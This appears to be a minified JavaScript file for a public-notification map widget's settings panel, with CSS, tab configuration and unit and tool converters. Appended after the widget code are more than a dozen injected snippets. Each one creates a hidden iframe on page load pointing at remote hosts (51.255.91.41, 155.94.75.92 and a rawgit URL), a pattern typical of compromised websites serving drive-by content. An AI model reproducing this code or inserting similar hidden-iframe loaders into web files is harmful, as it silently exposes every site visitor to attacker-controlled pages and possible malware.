#15a4fa;}.jimu-widget-public-notification-setting .fieldset {height: auto; width: 100%; border: 1px solid #a0acbf; border-radius: 5px; color: #596679; min-width: 0px;}.jimu-ltr .jimu-widget-public-notification-setting .fieldsetLegend {margin-left: 20px;}.jimu-rtl .jimu-widget-public-notification-setting .fieldsetLegend {margin-right: 20px;}.jimu-widget-public-notification-setting .fieldsetMainContainer {padding: 8px;}.jimu-widget-public-notification-setting.main-container {width: 100%; height: 100%; overflow: hidden; font-size: 14px;}.jimu-widget-public-notification-setting .jimu-viewstack {height: calc(100% - 42px);}.jimu-widget-public-notification-setting .view {overflow: auto;}.jimu-widget-public-notification-setting .tab-contents {padding: 10px 2px 1px 2px;}.jimu-widget-public-notification-setting .category-panel {width: 270px; overflow-y: auto; overflow-x: hidden;}.jimu-widget-public-notification-setting .details-panel {width: calc(100% - 290px); overflow-y: auto; overflow-x: hidden;}.jimu-widget-public-notification-setting .details-label {width: 120px;}.jimu-widget-public-notification-setting .details-value {width: calc(100% - 125px);}.jimu-widget-public-notification-setting .jimu-btn {line-height: 28px;}.jimu-ltr .jimu-widget-public-notification-setting .majorTrailingHorizGap {margin-right: 24px;}.jimu-rtl .jimu-widget-public-notification-setting .majorTrailingHorizGap {margin-left: 24px;}.jimu-ltr .jimu-widget-public-notification-setting .minorTrailingHorizGap {margin-right: 5px;}.jimu-rtl .jimu-widget-public-notification-setting .minorTrailingHorizGap {margin-left: 5px;}.jimu-widget-public-notification-setting .majorTrailingVertGap {margin-bottom: 12px;}.jimu-widget-public-notification-setting .minorTrailingVertGap {margin-bottom: 2px;}.jimu-widget-public-notification-setting .edit-button {background: url(images/edit_icon.png) no-repeat center; cursor: pointer; width: 20px; height: 30px; -webkit-flex-shrink: 0; flex-shrink: 0;}.jimu-widget-public-notification-setting .edit-button:hover {background-color: rgba(36, 181, 204, 0.4);}.jimu-widget-public-notification-setting .hint {font-size: 12px; font-style: italic; color: #999999; margin-top: 5px;}.jimu-widget-public-notification-setting .static-text {margin-top: 5px;}.jimu-ltr .jimu-widget-public-notification-setting .dijitNumberTextBox .dijitInputInner {text-align: left;}.jimu-rtl .jimu-widget-public-notification-setting .dijitNumberTextBox .dijitInputInner {text-align: right;}.jimu-widget-public-notification-setting .italic {font-style: italic;}.jimu-widget-public-notification-setting .full-width {width: 100%;}.jimu-widget-public-notification-setting .full-height {height: 100%;}.jimu-widget-public-notification-setting .half-width {width: 50%;}.jimu-widget-public-notification-setting .third-width {width: 33%;}.jimu-widget-public-notification-setting .two-thirds-width {width: 66%;}.jimu-ltr .jimu-widget-public-notification-setting .indented {padding-left: 22px;}.jimu-rtl .jimu-widget-public-notification-setting .indented {padding-right: 22px;}.jimu-widget-public-notification-setting .clear {clear: both;}.jimu-widget-public-notification-setting .inline-block {display: inline-block;}.jimu-widget-public-notification-setting .flexbox {display: -webkit-flex; display: flex;}.jimu-widget-public-notification-setting .variable-width {-webkit-flex-grow: 1; flex-grow: 1;}.jimu-widget-public-notification-setting .optionsTableHeaderHeight {margin-top: 36px;}.jimu-widget-public-notification-setting .hidden {visibility: hidden;}.jimu-widget-public-notification-setting .hiddenEmpty {display: none;}.jimu-widget-public-notification-setting .readOnlyTextField {border: solid #d9dde0 1px; padding: 5px 10px; min-height: 30px;}.jimu-widget-public-notification-setting-fields .fields-checkbox {width: 167px; margin-bottom: 20px; color: #596679; font-size: 14px; margin-left: 30px;}.jimu-widget-public-notification-setting-fields .fields-checkbox .label {width: 140px;}.jimu-rtl .jimu-widget-public-notification-setting-fields .fields-checkbox {margin-right: 30px; margin-left: auto;}',
"*now":function(b){b(['dojo/i18n!*preload*widgets/PublicNotification/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/dom-class dojo/dom-construct dojo/on dojo/string jimu/BaseWidgetSetting jimu/dijit/TabContainer3 jimu/LayerInfos/LayerInfos ./SettingAddresseesBlock ./SettingBufferBlock ./SettingCheckbox ./SettingCheckboxLabeled ./SettingContainer ./SettingInputLabeled ./SettingLabelFormats ./SettingOptionsTable ./SettingSearchSourcesBlock ./SettingStaticText dojo/domReady!".split(" "),function(b,g,d,e,h,c,a,q,n,p,l,f,k,m,r,t,w,y,z,x){return g([q],
{baseClass:"jimu-widget-public-notification-setting",_descriptions:[],_guidance:null,_webmapFeatureLayers:[],postCreate:function(){this.inherited(arguments);p.getInstance(this.map,this.map.itemInfo).then(d.hitch(this,function(a){this._webmapFeatureLayers=this._getWebmapFeatureLayers(a);this._descriptions=[];this._descriptions.push(this._createSearchSourceSettings());this._descriptions.push(this._createAddressSourceSettings());this._descriptions.push(this._createNotificationSettings());this._updateAddresseeSources(a);
this.setConfig(this.config);this._initTabs(this.tabsContainer,this._descriptions)}))},setConfig:function(a){this.config=d.mixin({},a||{},this.config);this.config.searchSourceSettings.drawing.tools=this._convertToolCodesToLabels(this.config.searchSourceSettings.drawing.tools);this.config.searchSourceSettings.drawing.buffer.bufferUnitsMenu=this._convertUnitCodesToLabels(this.config.searchSourceSettings.drawing.buffer.bufferUnitsMenu);this.config.notificationSettings.labelFormats=this._initializeLabelFormats(this.config.notificationSettings.labelFormats,
this.config.labelFormatTemplates);b.forEach(this._descriptions,d.hitch(this,function(a){a.content.setConfig(this.config)}))},getConfig:function(){b.forEach(this._descriptions,d.hitch(this,function(a){a.content.getConfig(this.config)}));this.config.searchSourceSettings.drawing.tools=this._convertLabelsToToolCodes(this.config.searchSourceSettings.drawing.tools);this.config.searchSourceSettings.drawing.buffer.bufferUnitsMenu=this._convertLabelsToUnitCodes(this.config.searchSourceSettings.drawing.buffer.bufferUnitsMenu);
return this.config},getDataSources:function(){},reset:function(){this.inherited(arguments)},destroy:function(){b.forEach(this._descriptions,function(a){a.node&&h.destroy(a.node)});this._descriptions=[];this.inherited(arguments)},_initializeLabelFormats:function(c,e){var u;if(Array.isArray(c)&&2<=c.length)return c;u=[a.rep("0",e.length)];b.forEach(e,function(b){var c={hint:""};"CSV"===b.labelSpec.type?c.name=this.nls.placeholders.descriptionCSV:(c.name=a.substitute(this.nls.placeholders.descriptionPDF,
b.descriptionPDF),b.descriptionPDF.averyPartNumber&&(c.hint=a.substitute(this.nls.placeholders.averyExample,b.descriptionPDF)));c.labelSpec=d.clone(b.labelSpec);u.push(c)},this);return u},_getWebmapFeatureLayers:function(a){var c=[];a=a.getLayerInfoArray();b.forEach(a,function(a){"ArcGISFeatureLayer"===a.originOperLayer.layerType&&c.push({name:a.title,layerId:a.id,url:a.originOperLayer.url,displayField:a.originOperLayer.layerObject.displayField,fields:a.originOperLayer.layerObject.fields})});return c},
_updateAddresseeSources:function(a){var c=[],d=[""],e;a=a.getLayerInfoArray();b.forEach(a,function(a){a.originOperLayer.popupInfo&&a.originOperLayer.popupInfo.description&&c.push(a)});this.config.addresseeSourceSettings.sources=this.config.addresseeSourceSettings.sources||[""];e=this.config.addresseeSourceSettings.sources[0];a=this.config.addresseeSourceSettings.sources.slice(1);b.forEach(a,function(a,u){var f=-1;b.some(c,function(b,c){return b.title===a.name?(f=c,!0):!1})&&(d[0]+=e[u],d.push(a),
c.splice(f,1))});b.forEach(c,function(a){d[0]+="0";d.push({name:a.title,useRelatedRecords:!1})});this.config.addresseeSourceSettings.sources=d},_initTabs:function(a,e){var u=[],f;b.forEach(e,function(a){u.push({title:a.title,content:a.node})});f=new n({tabs:u,"class":"full-height"});f.placeAt(a);this.own(c(f,"tabChanged",d.hitch(this,function(){f.containerNode.scrollTop=0})))},_createSearchSourceSettings:function(){var a,b=this.nls;a={title:b.searchSourceSetting.title,node:h.create("div",{"class":"tab-contents"}),
content:null};a.content=new r("searchSourceSettings","","majorTrailingVertGap",[new x(null,"full-width hint",b.searchSourceSetting.mainHint),new t("geometryServiceURL",!1,"full-width","details-label","details-value",b.propertyLabels.urlToGeometryService),new z("search",b,"",this.config.searchSourceTemplates,this._webmapFeatureLayers),new r("drawing","flexbox","majorTrailingHorizGap",b.groupingLabels.drawingTools,"full-width",[new y("tools","category-panel","",b.propertyLabels.tool,null,b.hints.selectionListOfOptionsToDisplay),
new f("buffer",b,"details-panel","details-label","details-value",this.config.bufferTemplate,b.propertyLabels.bufferDefaultDistance,"100")])]);h.place(a.content.div(),a.node);return a},_createAddressSourceSettings:function(){var a,b=this.nls;a={title:b.addressSourceSetting.title,node:h.create("div",{"class":"tab-contents"}),content:null};a.content=new r("addresseeSourceSettings","","majorTrailingVertGap",[new x(null,"full-width hint",b.addressSourceSetting.mainHint),new l("sources",b)]);h.place(a.content.div(),
a.node);return a},_createNotificationSettings:function(){var a,b=this.nls;a={title:b.notificationSetting.title,node:h.create("div",{"class":"tab-contents"}),content:null};this._guidance=new r("guidance","inline-block indented"+(this.config.notificationSettings.labelPageOptions.showGuidance?"":" hiddenEmpty"),"majorTrailingVertGap",[new m("showLabelOutlines","full-width","half-width","half-width",b.propertyLabels.showLabelOutlines),new m("showGrid","full-width","half-width","half-width",b.propertyLabels.showGridTickMarks),
new t("noteFontSizePx",!0,"full-width","half-width","half-width",b.propertyLabels.fontSizeAlignmentNote,"7","","",b.propertyLabels.pixels),new t("gridBlackPercent",!0,"full-width","half-width","half-width",b.propertyLabels.gridDarkness,"25","","",b.propertyLabels.percentBlack),new t("labelBorderBlackPercent",!0,"full-width","half-width","half-width",b.propertyLabels.labelBorderDarkness,"100","","",b.propertyLabels.percentBlack),new t("leftIn",!0,"full-width","half-width","half-width",b.propertyLabels.gridlineLeftInset,
"0.1667","","",jimuNls.units.inches),new t("rightIn",!0,"full-width","half-width","half-width",b.propertyLabels.gridlineRightInset,"0.1667","","",jimuNls.units.inches),new t("majorTickIn",!0,"full-width","half-width","half-width",b.propertyLabels.gridlineMajorTickMarksGap,"1","","",jimuNls.units.inches),new t("minorTickIn",!0,"full-width","half-width","half-width",b.propertyLabels.gridlineMinorTickMarksGap,"0.1","","",jimuNls.units.inches)]);a.content=new r("notificationSettings","","majorTrailingVertGap",
[new x(null,"full-width hint",b.notificationSetting.mainHint),new w("labelFormats",b,""),new r("labelPageOptions","flexbox","majorTrailingHorizGap",b.groupingLabels.printingOptions,"full-width",[new r(null,"half-width inline-block","majorTrailingVertGap",[new t("rasterResolutionPxPerIn",!0,"full-width hiddenEmpty","","full-width",b.propertyLabels.rasterResolution,"150",b.hints.rasterResolution,"",b.propertyLabels.pixelsPerInch),new k("useVectorFonts",b.propertyLabels.useVectorFonts)]),new r(null,
"half-width inline-block","majorTrailingVertGap",[new k("showGuidance",b.propertyLabels.showAlignmentAids,"",d.hitch(this,this._showHideGuidance)),this._guidance])])]);h.place(a.content.div(),a.node);return a},_showHideGuidance:function(a){a?e.remove(this._guidance._mainDiv,"hiddenEmpty"):e.add(this._guidance._mainDiv,"hiddenEmpty")},_convertUnitCodesToLabels:function(a){var c=[],d=jimuNls.units;b.forEach(a,function(a){switch(a){case "CENTIMETERS":c.push(d.centimeters);break;case "INCHES":c.push(d.inches);
break;case "FEET":c.push(d.feet);break;case "YARDS":c.push(d.yards);break;case "METERS":c.push(d.meters);break;case "KILOMETERS":c.push(d.kilometers);break;case "MILES":c.push(d.miles);break;default:c.push(a)}});return c},_convertLabelsToUnitCodes:function(a){var c=[],d=jimuNls.units;b.forEach(a,function(a){switch(a){case d.centimeters:c.push("CENTIMETERS");break;case d.inches:c.push("INCHES");break;case d.feet:c.push("FEET");break;case d.yards:c.push("YARDS");break;case d.meters:c.push("METERS");
break;case d.kilometers:c.push("KILOMETERS");break;case d.miles:c.push("MILES");break;default:c.push(a)}});return c},_convertToolCodesToLabels:function(a){var c=[],e=this.nls.propertyLabels;b.forEach(a,d.hitch(this,function(a){switch(a){case "POINT":c.push(e.drawingToolsPoint);break;case "LINE":c.push(e.drawingToolsLine);break;case "POLYLINE":c.push(e.drawingToolsPolyline);break;case "POLYGON":c.push(e.drawingToolsPolygon);break;case "FREEHAND_POLYGON":c.push(e.drawingToolsFreehandPolygon);break;
default:c.push(a)}}));return c},_convertLabelsToToolCodes:function(a){var c=[],e=this.nls.propertyLabels;b.forEach(a,d.hitch(this,function(a){switch(a){case e.drawingToolsPoint:c.push("POINT");break;case e.drawingToolsLine:c.push("LINE");break;case e.drawingToolsPolyline:c.push("POLYLINE");break;case e.drawingToolsPolygon:c.push("POLYGON");break;case e.drawingToolsFreehandPolygon:c.push("FREEHAND_POLYGON");break;default:c.push(a)}}));return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});